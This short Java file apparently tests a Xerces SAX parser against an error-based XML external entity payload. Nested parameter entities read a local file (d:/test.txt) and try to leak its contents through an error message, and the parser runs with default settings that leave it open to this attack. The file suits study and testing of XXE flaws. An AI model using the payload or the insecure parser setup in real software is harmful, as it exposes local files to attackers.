package org.example;

import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;

import java.io.IOException;

public class XRFandSAX {
    public static void main(String[] args) throws SAXException, IOException {
        XMLReader parser = XMLReaderFactory.createXMLReader("org.apache.xerces.parsers.SAXParser");
        parser.parse("<?xml version=\"1.0\" ?>\n" +
                "\n" +
                "<!DOCTYPE message [\n" +
                "\n" +
                "        <!ENTITY % NUMBER '\n" +
                "\n" +
                "        <!ENTITY &#x25; file SYSTEM \"file:///d:/test.txt\">\n" +
                "\n" +
                "        <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n" +
                "\n" +
                "        &#x25;eval;\n" +
                "\n" +
                "        &#x25;error;\n" +
                "\n" +
                "        '>\n" +
                "\n" +
                "        %NUMBER;\n" +
                "\n" +
                "        ]>\n" +
                "\n" +
                "<message>any text</message>");
    }
}
